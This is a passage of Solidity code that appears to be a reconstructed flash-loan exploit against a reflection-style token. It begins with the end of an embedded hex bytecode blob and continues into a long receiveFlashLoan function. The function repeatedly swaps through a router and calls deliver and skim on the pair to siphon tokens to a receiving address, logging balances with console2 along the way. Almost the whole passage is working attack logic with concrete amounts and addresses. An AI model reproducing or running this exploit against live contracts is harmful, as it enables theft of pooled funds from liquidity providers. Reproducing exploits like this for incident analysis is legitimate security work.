            hex"9695505050505050565b60006140bc6140b78461351b565b6133ff565b905080",
            hex"838252602082019050602084028301858111156140df576140de6131c1565b5b",
            hex"835b8181101561410857806140f48882613849565b8452602084019350506020",
            hex"810190506140e1565b5050509392505050565b600082601f8301126141275761",
            hex"41266131b7565b5b81516141378482602086016140a9565b9150509291505056",
            hex"5b60006020828403121561415657614155613119565b5b600082015167ffffff",
            hex"ffffffffff8111156141745761417361311e565b5b6141808482850161411256",
            hex"5b91505092915050565b6000819050919050565b60006141ae6141a96141a484",
            hex"614189565b61376a565b613181565b9050919050565b6141be81614193565b82",
            hex"525050565b60006040820190506141d960008301856132a4565b6141e6602083",
            hex"01846141b5565b9392505050565b6000819050919050565b6000614202826141",
            hex"ed565b91507f7fffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffffffff8203614234576142336138b5565b5b600182019050919050565b",
            hex"6000819050919050565b600061426461425f61425a8461423f565b61376a565b",
            hex"613181565b9050919050565b61427481614249565b82525050565b6000608082",
            hex"01905061428f600083018761426b565b61429c6020830186613eb0565b6142a9",
            hex"60408301856132a4565b81810360608301526142bb8184613ef4565b90509594",
            hex"5050505050565b60006080820190506142db6000830186613eb0565b6142e860",
            hex"2083018561388b565b6142f560408301846132a4565b81810360608301526143",
            hex"0681613ddf565b905094935050505056fea2646970667358221220748f4c5291",
            hex"de17a9e8f4c4d57ed6b11e84283eb80d63f73c1f610ed36511951e64736f6c63",
            hex"430008130033"
        );
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
        I(xc02a).approve(x7a25, type(uint256).max);

        bytes memory b01 = abi.encode(1);
        I(x30ac).swap(74213000000000000000, 0, r, b01);

        I(xb1f4).reflectionFromToken(74213000000000000000, false);
        // uint256 v1 = 19999995103327840124037;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "19999995103327840124037 (19999.9951 ether)");

        address[] memory arr06 = new address[](2);
        arr06[0] = xc02a;
        arr06[1] = xb1f4;
        I(x7a25).swapTokensForExactTokens(16730000000000000000, v1, arr06, r, block.timestamp + 1);

        I(xb1f4).reflectionFromToken(16730000000000000000, false);

        bytes memory b03 = abi.encode(0);
        I(x30ac).swap(100000000000000000000, 0, r, b03);

        I(xb1f4).transfer(r, 1);

        address[] memory arr08 = new address[](2);
        arr08[0] = xc02a;
        arr08[1] = xb1f4;
        I(x7a25).swapTokensForExactTokens(11120000000000000000, v1, arr08, r, block.timestamp + 1);

        I(xb1f4).reflectionFromToken(11120000000000000000, false);

        bytes memory b05 = abi.encode(0);
        I(x30ac).swap(100000000000000000000, 0, r, b05);

        I(xb1f4).transfer(r, 1);

        address[] memory arr10 = new address[](2);
        arr10[0] = xc02a;
        arr10[1] = xb1f4;
        I(x7a25).swapTokensForExactTokens(11120000000000000000, v1, arr10, r, block.timestamp + 1);

        I(xb1f4).reflectionFromToken(11120000000000000000, false);

        bytes memory b07 = abi.encode(0);
        I(x30ac).swap(100000000000000000000, 0, r, b07);

        I(xb1f4).transfer(r, 1);

        address[] memory arr12 = new address[](2);
        arr12[0] = xc02a;
        arr12[1] = xb1f4;
        I(x7a25).swapTokensForExactTokens(11120000000000000000, v1, arr12, r, block.timestamp + 1);

        I(xb1f4).reflectionFromToken(11120000000000000000, false);

        bytes memory b09 = abi.encode(0);
        I(x30ac).swap(100000000000000000000, 0, r, b09);

        I(xb1f4).transfer(r, 1);

        address[] memory arr14 = new address[](2);
        arr14[0] = xc02a;
        arr14[1] = xb1f4;
        I(x7a25).swapTokensForExactTokens(11120000000000000000, v1, arr14, r, block.timestamp + 1);

        I(xb1f4).reflectionFromToken(11120000000000000000, false);

        bytes memory b11 = abi.encode(0);
        I(x30ac).swap(100000000000000000000, 0, r, b11);

        I(xb1f4).transfer(r, 1);

        address[] memory arr16 = new address[](2);
        arr16[0] = xc02a;
        arr16[1] = xb1f4;
        I(x7a25).swapTokensForExactTokens(11120000000000000000, v1, arr16, r, block.timestamp + 1);

        I(xb1f4).reflectionFromToken(11120000000000000000, false);

        bytes memory b13 = abi.encode(0);
        I(x30ac).swap(100000000000000000000, 0, r, b13);

        I(xb1f4).transfer(r, 1);

        address[] memory arr18 = new address[](2);
        arr18[0] = xc02a;
        arr18[1] = xb1f4;
        I(x7a25).swapTokensForExactTokens(11120000000000000000, v1, arr18, r, block.timestamp + 1);

        I(xb1f4).reflectionFromToken(11120000000000000000, false);
        {

            bytes memory b15 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b15);

            I(xb1f4).transfer(r, 1);

            address[] memory arr20 = new address[](2);
            arr20[0] = xc02a;
            arr20[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr20, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b17 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b17);

            I(xb1f4).transfer(r, 1);

            address[] memory arr22 = new address[](2);
            arr22[0] = xc02a;
            arr22[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr22, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b19 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b19);

            I(xb1f4).transfer(r, 1);

            address[] memory arr24 = new address[](2);
            arr24[0] = xc02a;
            arr24[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr24, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b21 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b21);

            I(xb1f4).transfer(r, 1);

            address[] memory arr26 = new address[](2);
            arr26[0] = xc02a;
            arr26[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr26, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b23 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b23);

            I(xb1f4).transfer(r, 1);

            address[] memory arr28 = new address[](2);
            arr28[0] = xc02a;
            arr28[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr28, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b25 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b25);

            I(xb1f4).transfer(r, 1);

            address[] memory arr30 = new address[](2);
            arr30[0] = xc02a;
            arr30[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr30, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b27 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b27);

            I(xb1f4).transfer(r, 1);

            address[] memory arr32 = new address[](2);
            arr32[0] = xc02a;
            arr32[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr32, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b29 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b29);

            I(xb1f4).transfer(r, 1);
        }
        {

            address[] memory arr34 = new address[](2);
            arr34[0] = xc02a;
            arr34[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr34, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b31 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b31);

            I(xb1f4).transfer(r, 1);

            address[] memory arr36 = new address[](2);
            arr36[0] = xc02a;
            arr36[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(11120000000000000000, 19999995103327840124037, arr36, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(11120000000000000000, false);

            bytes memory b33 = abi.encode(0);
            I(x30ac).swap(100000000000000000000, 0, r, b33);

            I(xb1f4).transfer(r, 1);

            address[] memory arr38 = new address[](2);
            arr38[0] = xc02a;
            arr38[1] = xb1f4;
            I(x7a25)
                .swapTokensForExactTokens(8562400000000000000, 19999995103327840124037, arr38, r, block.timestamp + 1);

            I(xb1f4).reflectionFromToken(8562400000000000000, false);

            bytes memory b35 = abi.encode(0);
            I(x30ac).swap(77000000000000000000, 0, r, b35);

            I(xb1f4).transfer(r, 1);
            // uint256 v2 = 999411477952807469068;
            uint256 v2 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999411477952807469068 (999.4114 ether)");
            // uint256 v3 = 19983476372450004069581;
            uint256 v3 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "19983476372450004069581 (19983.4763 ether)");
            // uint256 v4 = 1000000000000000000000;
            uint256 v4 = I(xb1f4).totalSupply();
            console2.log("I(xb1f4).totalSupply()\t->", "1000000000000000000000 (1000.0 ether)");

            address[] memory arr40 = new address[](2);
            arr40[0] = xc02a;
            arr40[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(588522047192530931, v3, arr40, r, block.timestamp + 1);

            I(xb1f4).transfer(r, 1);
            // uint256 v5 = 19983436622639662249615;
            uint256 v5 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "19983436622639662249615 (19983.4366 ether)");
            // uint256 v6 = 999150957187854187612;
            uint256 v6 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "999150957187854187612 (999.1509 ether)");

            address[] memory arr42 = new address[](2);
            arr42[0] = xc02a;
            arr42[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(989150957187854187612, v5, arr42, x4b90, block.timestamp + 1);

            I(xb1f4).transfer(r, 1);
            // uint256 v7 = 13305444661566944357530;
            uint256 v7 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566944357530 (13305.4446 ether)");
            // uint256 v8 = 10000000000000000000;
            uint256 v8 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "10000000000000000000 (10.0 ether)");
            // uint256 v9 = 999999999999999999999;
            uint256 v9 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999999999 (999.9999 ether)");

            address[] memory arr43 = new address[](2);
            arr43[0] = xc02a;
            arr43[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(1000, v7, arr43, x4b90, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v10 = 13305444661566943680970;
            uint256 v10 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566943680970 (13305.4446 ether)");
            // uint256 v11 = 9999999999999999000;
            uint256 v11 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999999000 (9.9999 ether)");
        }
        {
            // uint256 v12 = 999999999999999999928;
            uint256 v12 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999999928 (999.9999 ether)");
            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v13 = 13305444661566943680970;
            uint256 v13 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566943680970 (13305.4446 ether)");
            // uint256 v14 = 9999999999999999000;
            uint256 v14 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999999000 (9.9999 ether)");
            // uint256 v15 = 999999999999999992823;
            uint256 v15 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999992823 (999.9999 ether)");

            address[] memory arr44 = new address[](2);
            arr44[0] = xc02a;
            arr44[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(6177, v13, arr44, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v16 = 13305444661566939501859;
            uint256 v16 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566939501859 (13305.4446 ether)");
            // uint256 v17 = 9999999999999992829;
            uint256 v17 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999992829 (9.9999 ether)");
            // uint256 v18 = 999999999999999900054;
            uint256 v18 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900054 (999.9999 ether)");

            address[] memory arr45 = new address[](2);
            arr45[0] = xc02a;
            arr45[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98946, v16, arr45, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v19 = 13305444661566872558967;
            uint256 v19 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566872558967 (13305.4446 ether)");
            // uint256 v20 = 9999999999999893982;
            uint256 v20 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999893982 (9.9999 ether)");
            // uint256 v21 = 999999999999999900039;
            uint256 v21 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900039 (999.9999 ether)");

            address[] memory arr46 = new address[](2);
            arr46[0] = xc02a;
            arr46[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98961, v19, arr46, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v22 = 13305444661566805605926;
            uint256 v22 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566805605926 (13305.4446 ether)");
            // uint256 v23 = 9999999999999795119;
            uint256 v23 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999795119 (9.9999 ether)");
            // uint256 v24 = 999999999999999900000;
            uint256 v24 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900000 (999.9999 ether)");

            address[] memory arr47 = new address[](2);
            arr47[0] = xc02a;
            arr47[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(99000, v22, arr47, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
        }
        {
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v25 = 13305444661566738626500;
            uint256 v25 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566738626500 (13305.4446 ether)");
            // uint256 v26 = 9999999999999696218;
            uint256 v26 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999696218 (9.9999 ether)");
            // uint256 v27 = 999999999999999900069;
            uint256 v27 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900069 (999.9999 ether)");

            address[] memory arr48 = new address[](2);
            arr48[0] = xc02a;
            arr48[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98931, v25, arr48, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v28 = 13305444661566671693756;
            uint256 v28 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305444661566671693756 (13305.4446 ether)");
            // uint256 v29 = 10000025836723680905;
            uint256 v29 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "10000025836723680905 (10.2583 ether)");
            // uint256 v30 = 999999999999999900029;
            uint256 v30 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900029 (999.9999 ether)");

            address[] memory arr50 = new address[](2);
            arr50[0] = xc02a;
            arr50[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(25836723681905, v28, arr50, x4b90, block.timestamp + 1);

            address[] memory arr51 = new address[](2);
            arr51[0] = xc02a;
            arr51[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98971, v28, arr51, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v31 = 13305427181521516537624;
            uint256 v31 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305427181521516537624 (13305.4271 ether)");
            // uint256 v32 = 9999999999999900128;
            uint256 v32 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999900128 (9.9999 ether)");
            // uint256 v33 = 999999999999999900084;
            uint256 v33 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900084 (999.9999 ether)");

            address[] memory arr52 = new address[](2);
            arr52[0] = xc02a;
            arr52[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98916, v31, arr52, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v34 = 13305427181521449615028;
            uint256 v34 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305427181521449615028 (13305.4271 ether)");
            // uint256 v35 = 9999999999999801311;
            uint256 v35 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999801311 (9.9999 ether)");
            // uint256 v36 = 999999999999999900054;
            uint256 v36 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900054 (999.9999 ether)");

            address[] memory arr53 = new address[](2);
            arr53[0] = xc02a;
            arr53[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98946, v34, arr53, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
        }
        {
            I(xb1f4).transfer(r, 1);
            // uint256 v37 = 13305427181521382672135;
            uint256 v37 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305427181521382672135 (13305.4271 ether)");
            // uint256 v38 = 9999999999999702464;
            uint256 v38 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999702464 (9.9999 ether)");
            // uint256 v39 = 999999999999999900024;
            uint256 v39 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900024 (999.9999 ether)");

            address[] memory arr54 = new address[](2);
            arr54[0] = xc02a;
            arr54[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98976, v37, arr54, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v40 = 13305427181521315708945;
            uint256 v40 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305427181521315708945 (13305.4271 ether)");
            // uint256 v41 = 9999999999999603587;
            uint256 v41 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999603587 (9.9999 ether)");
            // uint256 v42 = 999999999999999900064;
            uint256 v42 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900064 (999.9999 ether)");

            address[] memory arr55 = new address[](2);
            arr55[0] = xc02a;
            arr55[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98936, v40, arr55, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v43 = 13305427181521248772817;
            uint256 v43 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305427181521248772817 (13305.4271 ether)");
            // uint256 v44 = 10000099970937868117;
            uint256 v44 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "10000099970937868117 (10.9997 ether)");
            // uint256 v45 = 999999999999999900059;
            uint256 v45 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900059 (999.9999 ether)");

            address[] memory arr57 = new address[](2);
            arr57[0] = xc02a;
            arr57[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(99970937869117, v43, arr57, x4b90, block.timestamp + 1);

            address[] memory arr58 = new address[](2);
            arr58[0] = xc02a;
            arr58[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98941, v43, arr58, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v46 = 13305359545870695658514;
            uint256 v46 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305359545870695658514 (13305.3595 ether)");
            // uint256 v47 = 9999999999999900158;
            uint256 v47 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999900158 (9.9999 ether)");
            // uint256 v48 = 999999999999999900069;
            uint256 v48 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900069 (999.9999 ether)");

            address[] memory arr59 = new address[](2);
            arr59[0] = xc02a;
            arr59[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98931, v46, arr59, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
        }
        {
            // uint256 v49 = 13305359545870628725765;
            uint256 v49 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305359545870628725765 (13305.3595 ether)");
            // uint256 v50 = 9999999999999801326;
            uint256 v50 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999801326 (9.9999 ether)");
            // uint256 v51 = 999999999999999900048;
            uint256 v51 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900048 (999.9999 ether)");

            address[] memory arr60 = new address[](2);
            arr60[0] = xc02a;
            arr60[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98952, v49, arr60, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v52 = 13305359545870561778808;
            uint256 v52 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305359545870561778808 (13305.3595 ether)");
            // uint256 v53 = 9999999999999702473;
            uint256 v53 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999702473 (9.9999 ether)");
            // uint256 v54 = 999999999999999900043;
            uint256 v54 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900043 (999.9999 ether)");

            address[] memory arr61 = new address[](2);
            arr61[0] = xc02a;
            arr61[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98957, v52, arr61, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v55 = 13305359545870494828469;
            uint256 v55 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305359545870494828469 (13305.3595 ether)");
            // uint256 v56 = 9999999999999603615;
            uint256 v56 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999603615 (9.9999 ether)");
            // uint256 v57 = 999999999999999900077;
            uint256 v57 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900077 (999.9999 ether)");

            address[] memory arr62 = new address[](2);
            arr62[0] = xc02a;
            arr62[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98923, v55, arr62, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v58 = 13305359545870427901133;
            uint256 v58 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305359545870427901133 (13305.3595 ether)");
            // uint256 v59 = 10000099944931400112;
            uint256 v59 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "10000099944931400112 (10.9994 ether)");
            // uint256 v60 = 999999999999999900088;
            uint256 v60 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999900088 (999.9999 ether)");

            address[] memory arr64 = new address[](2);
            arr64[0] = xc02a;
            arr64[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(99944931401112, v58, arr64, x4b90, block.timestamp + 1);

            address[] memory arr65 = new address[](2);
            arr65[0] = xc02a;
            arr65[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(98912, v58, arr65, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v61 = 13305291927810394734117;
            uint256 v61 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305291927810394734117 (13305.2919 ether)");
        }
        {
            // uint256 v62 = 9999999999999900187;
            uint256 v62 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999900187 (9.9999 ether)");
            // uint256 v63 = 999999999999999897799;
            uint256 v63 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999999897799 (999.9999 ether)");

            address[] memory arr66 = new address[](2);
            arr66[0] = xc02a;
            arr66[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(101201, 13305291927810394734117, arr66, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v64 = 13305291927810326265573;
            uint256 v64 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305291927810326265573 (13305.2919 ether)");
            // uint256 v65 = 9999999999999799088;
            uint256 v65 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999799088 (9.9999 ether)");
            // uint256 v66 = 1000000000000000051546;
            uint256 v66 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "1000000000000000051546 (1000.5154 ether)");
            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v67 = 13305291927810326265573;
            uint256 v67 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305291927810326265573 (13305.2919 ether)");
            // uint256 v68 = 9999999999999799088;
            uint256 v68 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999799088 (9.9999 ether)");
            // uint256 v69 = 1000000000000026587926;
            uint256 v69 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "1000000000000026587926 (1000.2658 ether)");
            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v70 = 13305291927810326265573;
            uint256 v70 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305291927810326265573 (13305.2919 ether)");
            // uint256 v71 = 9999999999999799088;
            uint256 v71 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "9999999999999799088 (9.9999 ether)");
            // uint256 v72 = 999999999999188649793;
            uint256 v72 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "999999999999188649793 (999.9999 ether)");

            address[] memory arr67 = new address[](2);
            arr67[0] = xc02a;
            arr67[1] = xb1f4;
            I(x7a25).swapTokensForExactTokens(811349207, v70, arr67, r, block.timestamp + 1);

            I(xb1f4).deliver(990000000000000000000);
            I(x30ac).skim(x4b90);
            I(xb1f4).transfer(r, 1);
            // uint256 v73 = 13305291927261399886473;
            uint256 v73 = I(xc02a).balanceOf(r);
            console2.log("I(xc02a).balanceOf(r)\t\t->", "13305291927261399886473 (13305.2919 ether)");
            // uint256 v74 = 10000099936436287943;
            uint256 v74 = I(xb1f4).balanceOf(x30ac);
            console2.log("I(xb1f4).balanceOf(x30ac)\t->", "10000099936436287943 (10.9993 ether)");
            // uint256 v75 = 1000000000134774643725;
            uint256 v75 = I(xb1f4).balanceOf(r);
            console2.log("I(xb1f4).balanceOf(r)\t\t->", "1000000000134774643725 (1000.1347 ether)");

            address[] memory arr69 = new address[](2);
